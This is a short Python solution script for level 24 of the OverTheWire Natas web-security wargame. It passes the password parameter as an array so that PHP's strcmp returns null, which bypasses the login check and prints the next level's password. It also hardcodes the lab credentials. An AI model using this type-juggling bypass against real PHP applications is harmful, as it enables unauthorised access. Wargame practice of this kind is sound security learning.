#!/bin/python3

import requests
import re
import html.parser

username = 'natas24'
password = "OsRmXFguozKpTZZ5X14zNO43379LZveg"
url = 'http://%s.natas.labs.overthewire.org?passwd[]=""' % (username)
session = requests.Session()

response = session.get(url + '' ,auth = (username,password))
content = response.text
# print (content)
print (re.findall("Password: (.*)</pre>",content)[0])


#for this one the source code is comparing the passwd
#variable being passed in to the actual password
#using strcmp
#unfortunately strcmp will return null if passed an array as an argument
#so doing so will get us the password we need
